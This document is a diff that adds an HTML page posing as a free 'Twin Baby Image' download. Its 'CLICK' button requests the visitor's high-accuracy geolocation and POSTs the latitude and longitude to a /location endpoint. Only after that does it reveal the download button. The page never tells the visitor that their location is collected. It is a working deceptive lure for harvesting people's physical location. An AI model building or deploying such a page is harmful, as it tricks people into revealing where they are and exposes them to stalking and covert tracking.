@@ -1,0 +1,132 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+
+<title>Free Image Download</title>
+
+<style>
+
+body{
+    font-family: Arial;
+    text-align: center;
+    background: #f2f2f2;
+}
+
+.container{
+    margin-top: 60px;
+}
+
+img{
+    border-radius: 10px;
+    box-shadow: 0px 0px 10px gray;
+}
+
+button{
+    padding: 12px 25px;
+    background: black;
+    color: white;
+    border: none;
+    border-radius: 5px;
+    cursor: pointer;
+    margin-top: 15px;
+}
+
+#downloadBtn{
+    display:none;
+}
+
+</style>
+
+</head>
+
+<body>
+
+<div class="container">
+
+<h1>Twin Baby Image Download</h1>
+
+<img src="/image" width="300">
+<br>
+
+<!-- LOCATION BUTTON -->
+<button onclick="getLocation()" id="locationBtn">
+CLICK 
+</button>
+
+<!-- DOWNLOAD BUTTON -->
+<a href="/download" download>
+<button id="downloadBtn">
+Download Image
+</button>
+</a>
+
+<p id="status"></p>
+
+</div>
+
+<script>
+
+function getLocation(){
+
+navigator.geolocation.getCurrentPosition(
+sendData,
+showError,
+{
+enableHighAccuracy: true,
+timeout: 10000,
+maximumAge: 0
+}
+);
+
+}
+
+function sendData(position){
+
+let lat = position.coords.latitude;
+let lon = position.coords.longitude;
+
+document.getElementById("status").innerText = "Loading...";
+
+fetch("/location", {
+
+method: "POST",
+
+headers: {
+"Content-Type": "application/json"
+},
+
+body: JSON.stringify({
+latitude: lat,
+longitude: lon
+})
+
+})
+.then(res => res.text())
+.then(data => {
+
+console.log(data);
+
+// HIDE LOCATION BUTTON
+document.getElementById("locationBtn").style.display =
+"none";
+
+// SHOW DOWNLOAD BUTTON
+document.getElementById("downloadBtn").style.display =
+"inline-block";
+
+});
+
+}
+
+function showError(error){
+
+document.getElementById("status").innerText =
+"Location access denied";
+
+}
+
+</script>
+
+</body>
+</html>
